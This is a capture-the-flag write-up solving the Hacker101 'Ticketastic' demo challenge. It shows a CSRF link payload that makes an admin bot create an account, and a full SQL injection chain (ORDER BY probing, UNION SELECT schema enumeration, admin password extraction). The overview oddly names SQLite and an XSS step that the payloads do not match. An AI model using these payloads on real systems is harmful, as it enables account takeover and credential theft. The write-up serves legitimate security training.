# Ticketastic: Demo Instance — Writeup (2/2)

**Difficulty:** Moderate  
**Category:** Web (CSRF, SQL Injection)  
**Flags:** 2/2 (complete)  
**Platform:** Hacker101 CTF  
**Hint:** "This level and the Ticketastic live instance are running the same code"

---

## Challenge Overview

**Context:** A support ticket system with an admin panel. The "Demo" instance exposes default credentials that reveal the internal functionality, allowing you to understand how to exploit the "Live" instance running the same vulnerabilities.

**What you face:** A ticketing application where any user can create tickets, but only admins have full panel access. The code is identical to the Live Instance.

**Vulnerabilities exploited:**
- CSRF — `newUser` endpoint accepts GET requests without a CSRF token
- Stored XSS via links in tickets — admin clicks the malicious link
- SQL Injection on the `id` parameter of the `/ticket` endpoint

**What you learn:**
- How a "Demo" instance can be used to understand the logic before attacking the "Live" instance
- CSRF on user-creation endpoints via clickable links in tickets
- SQL Injection with UNION SELECT in SQLite to extract schema and data
- Difference between a demo instance (default credentials) and production

---

## Flag 0 — CSRF via ticket link (user creation)

**Vulnerability:** The `newUser` endpoint accepts GET requests without CSRF validation, allowing creation of an admin user by convincing an admin to click a link.

### Step 1: Explore the Demo Instance

On the Demo instance, log in with `admin:admin` (default credentials) to understand the application. Note the existence of the endpoint:

```
GET /newUser?username=attacker&password=pass123&password2=pass123
```

### Step 2: Create a ticket with a malicious link

On the Live Instance (same vulnerabilities), create a ticket with a link pointing to the user creation endpoint:

```
Title: anything
Body:
<a href="http://localhost/newUser?username=attacker&password=pass123&password2=pass123">
  click here
</a>
```

### Step 3: Admin clicks the link

The admin bot that monitors tickets will click the link. The request is made by the admin (localhost), creating the account.

### Step 4: Log in with the new account

Log in with `attacker:pass123`. The flag appears in the new user's panel.

---

## Flag 1 — SQL Injection on ticket ID

**Vulnerability:** The `id` parameter in `/ticket?id=N` is directly interpolated into the SQL query without parameterization.

### Step 1: Detect the injection

```
GET /ticket?id=1'
```
→ SQL error (MySQL syntax error)

```
GET /ticket?id=1 and 1=1
```
→ Works normally

### Step 2: Discover number of columns

```
GET /ticket?id=1 ORDER BY 1
GET /ticket?id=1 ORDER BY 2
GET /ticket?id=1 ORDER BY 3
GET /ticket?id=1 ORDER BY 4  ← error here = 3 columns
```

### Step 3: Enumerate tables

```
GET /ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--
```
Result: `tickets,users`

### Step 4: Enumerate columns in the users table

```
GET /ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--
```
Result: `id,username,password`

### Step 5: Extract admin password (= flag)

```
GET /ticket?id=1.1 UNION SELECT 1,password,3 FROM users WHERE username='admin'--
```
The response contains the flag (the password field *is* the flag).

---

## Attack Summary

```
FLAG 0: Demo (admin:admin) → understand newUser endpoint → ticket with CSRF link
        → admin clicks → account created → login → flag
FLAG 1: /ticket?id=1' → ORDER BY 3 → UNION SELECT tables → UNION SELECT password
        FROM users WHERE username='admin'-- → flag
```

---

## Demo vs Live Comparison

| Aspect | Demo | Live |
|--------|------|------|
| Admin login | `admin:admin` (obvious) | unknown (no direct access) |
| Vulnerabilities | same | same |
| CTF use | recon of `newUser` endpoint | flag targets |

The Demo instance is used to understand the endpoints before attacking the Live instance, which has no public registration link.

---

## Lessons Learned

1. **Demo instances** often expose functionality that reveals how to attack production
2. **CSRF on GET** — state-changing endpoints must never accept GET without a CSRF token
3. **Admin bots** that open user-submitted links are CSRF/XSS vectors
4. **SQL Injection with ORDER BY** to discover the number of columns is more reliable than blind UNION
5. **INFORMATION_SCHEMA** for schema enumeration — standard in MySQL/MariaDB
